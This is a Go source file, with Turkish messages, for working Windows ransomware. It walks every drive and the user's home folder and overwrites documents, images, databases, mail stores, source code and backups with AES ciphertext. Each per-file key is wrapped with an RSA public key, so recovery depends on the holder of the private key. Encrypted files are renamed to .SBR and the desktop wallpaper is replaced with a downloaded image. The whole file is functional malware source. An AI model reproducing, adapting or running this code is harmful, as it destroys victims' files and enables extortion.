package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"log"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"unsafe"
)

var publicKey *rsa.PublicKey

func main() {
	windowsDrivers := getDrives()
	fmt.Println(windowsDrivers)
	for index, driver := range windowsDrivers {
		if driver == "C:\\" {
			userDir, err := userDirectory()
			if err == nil {
				windowsDrivers[index] = userDir
			}
		}
	}
	fmt.Println(windowsDrivers)
	publicKeys := "public_key.pem"
	publicKeyBytes, err := os.ReadFile(publicKeys)
	if err != nil {
		log.Fatal(err)
	}
	publicKey, err = loadPublicKeyFromVariable(string(publicKeyBytes))
	if err != nil {
		log.Fatal(err)
	}
	for _, driver := range windowsDrivers {
		travelDirectory(driver)
	}
	fmt.Println("Background image changing!!!")
	path,_:=downloadImage("https://miro.medium.com/v2/resize:fit:1400/0*y2OAF_DSarBAjihO.jpg","siberkampus")
	changeBackgroundWallpaper(path)

}

func userDirectory() (string, error) {
	currentUser, err := user.Current()
	if err != nil {
		fmt.Println("Kullanıcı bilgisi alınamadı:", err)
		return "", err
	}
	return currentUser.HomeDir, nil
}

func travelDirectory(driver string) {
	_ = filepath.Walk(driver,
		func(path string, info fs.FileInfo, err error) error {
			if err != nil {
				log.Println(err)
			}
			if strings.Contains(path, "AppData") {
				return filepath.SkipDir
			}
			if !info.IsDir() {
				if extensionControl(path) {
					fmt.Println(path)
					fileData, err := os.ReadFile(path)
					if err != nil {
						log.Println("Dosya okuma hatası:", err)
					}

					file, err := os.OpenFile(path, os.O_RDWR, 0o644)
					if err != nil {
						log.Println(err)
					}
					defer file.Close()
					file.Seek(0, 0)
					file.Truncate(0)
					writer := bufio.NewWriter(file)

					key := make([]byte, 32)
					_, err = io.ReadFull(rand.Reader, key)
					if err != nil {
						log.Println("Anahtar oluşturma hatası:", err)
					}

					var result string

					encryptedKey, err := rsaEncrypt(publicKey, key)
					if err != nil {
						log.Println("RSA şifreleme hatası:", err)
					}

					result, err = encrypt(fileData, key)
					if err != nil {
						log.Println("AES şifreleme hatası:", err)
					}

					extension := filepath.Ext(path)
					result = hex.EncodeToString(encryptedKey) + ":" + extension[1:] + ":" + result
					_, err = writer.WriteString(result)
					if err != nil {
						log.Println("Veri yazma hatası:", err)
					}
					writer.Flush()
					file.Close()
					changeExtension(path)
				}
			}

			return nil
		})
}

func extensionControl(filePath string) bool {
	regex := `\.(docx?|xlsx?|pptx?|pdf|txt|rtf|odt|jpg|jpeg|png|bmp|gif|tiff|mp3|mp4|wav|wma|wmv|mov|avi|flv|mkv|zip|rar|7z|tar|gz|tgz|sql|db|mdb|accdb|sqlite|eml|msg|pst|ost|php|asp|aspx|html?|js|java|cpp|py|cs|bak|backup|xml|json|ini|log)$`
	r, _ := regexp.Compile(regex)
	return r.MatchString(filePath)

}

func changeExtension(filePath string) {
	newExtension := ".SBR"

	base := filepath.Base(filePath)
	newFileName := base[:len(base)-len(filepath.Ext(base))] + newExtension

	newPath := filepath.Join(filepath.Dir(filePath), newFileName)

	err := os.Rename(filePath, newPath)
	if err != nil {
		fmt.Println("Hata:", err)
		return
	}

	fmt.Println("Dosya adı başarıyla değiştirildi:", newPath)
}

func getDrives() []string {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getLogicalDrives := kernel32.NewProc("GetLogicalDrives")

	ret, _, _ := getLogicalDrives.Call()

	var drives []string
	for i := 0; i < 26; i++ {
		if ret&(1<<i) != 0 {
			driveLetter := string('A'+i) + ":\\"
			drives = append(drives, driveLetter)
		}
	}

	return drives
}

func loadPublicKeyFromVariable(pubKeyData string) (*rsa.PublicKey, error) {
	block, _ := pem.Decode([]byte(pubKeyData))
	if block == nil || block.Type != "PUBLIC KEY" {
		return nil, errors.New("geçersiz PEM formatı veya PUBLIC KEY bulunamadı")
	}

	pubKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("public key parsing hatası: %v", err)
	}

	rsaPubKey, ok := pubKey.(*rsa.PublicKey)
	if !ok {
		return nil, errors.New("RSA public key bekleniyordu, başka bir anahtar türü bulundu")
	}

	return rsaPubKey, nil
}

const (
	SPI_SETDESKWALLPAPER = 20
	SPIF_UPDATEINIFILE   = 0x01
	SPIF_SENDCHANGE      = 0x02
)

var (
	user32                   = syscall.NewLazyDLL("user32.dll")
	procSystemParametersInfo = user32.NewProc("SystemParametersInfoW")
)

func changeBackgroundWallpaper(imagePath string) error {

	utf16ImagePath, err := syscall.UTF16PtrFromString(imagePath)
	if err != nil {
		return fmt.Errorf("dosya yolunu Unicode'ya dönüştürme hatası: %v", err)
	}

	ret, _, _ := procSystemParametersInfo.Call(
		uintptr(SPI_SETDESKWALLPAPER),
		0,
		uintptr(unsafe.Pointer(utf16ImagePath)),
		uintptr(SPIF_UPDATEINIFILE|SPIF_SENDCHANGE),
	)

	if ret == 0 {
		return fmt.Errorf("duvar kağıdı değiştirme hatası")
	}
	return nil
}

func rsaEncrypt(publicKey *rsa.PublicKey, data []byte) ([]byte, error) {

	encryptedData, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey, data, nil)
	if err != nil {
		return nil, fmt.Errorf("RSA şifreleme hatası: %v", err)
	}
	return encryptedData, nil
}

func encrypt(plaintext []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("AES anahtar oluşturma hatası: %v", err)
	}
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	_, err = rand.Read(iv)
	if err != nil {
		return "", fmt.Errorf("IV oluşturma hatası: %v", err)
	}
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

	return hex.EncodeToString(ciphertext), nil
}

func downloadImage(url, filename string) (string, error) {
	response, err := http.Get(url)
	if err != nil {
		return "", fmt.Errorf("resim indirme hatası: %v", err)
	}
	defer response.Body.Close()


	if response.StatusCode != http.StatusOK {
		return "", fmt.Errorf("HTTP hatası: %s", response.Status)
	}


	file, err := os.Create(filename)
	if err != nil {
		return "", fmt.Errorf("dosya oluşturma hatası: %v", err)
	}
	defer file.Close()

	
	_, err = io.Copy(file, response.Body)
	if err != nil {
		return "", fmt.Errorf("dosyaya yazma hatası: %v", err)
	}

	
	absPath, err := filepath.Abs(filename)
	if err != nil {
		return "", fmt.Errorf("tam yolu oluşturma hatası: %v", err)
	}

	return absPath, nil
}
